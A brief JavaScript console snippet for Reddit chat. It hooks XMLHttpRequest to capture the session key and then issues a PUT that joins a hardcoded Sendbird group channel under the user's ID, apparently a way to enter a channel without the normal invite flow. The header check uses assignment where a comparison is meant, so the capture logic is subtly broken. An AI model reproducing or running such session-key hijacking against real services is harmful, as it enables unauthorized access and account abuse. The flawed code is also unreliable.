// Go to https://www.reddit.com/chat and run script, navigate around between a few chats, then refresh.

var setRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
XMLHttpRequest.prototype.setRequestHeader = function() {
	if(arguments[0] = "Session-Key") {
		XMLHttpRequest.prototype.setRequestHeader = setRequestHeader;
		session = arguments[1];
	}
	setRequestHeader.apply(this, arguments);
}

var open = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function() {
	var urlMatch = arguments[1].match(/https:\/\/sendbirdproxy\.chat\.redditmedia\.com\/v3\/users\/(.+)\//);
	if(urlMatch && session) {
		XMLHttpRequest.prototype.open = open;
		this.open("PUT", "https://sendbirdproxy.chat.redditmedia.com/v3/group_channels/sendbird_group_channel_1557514_fe36cb61c0eca903877eafd1778bf0dee8a5ad5b/join");
		this.setRequestHeader("Session-Key", session);
		this.send("{\"user_id\":\"" + urlMatch[1] + "\"}");
		return;
	}
	open.apply(this, arguments);
}
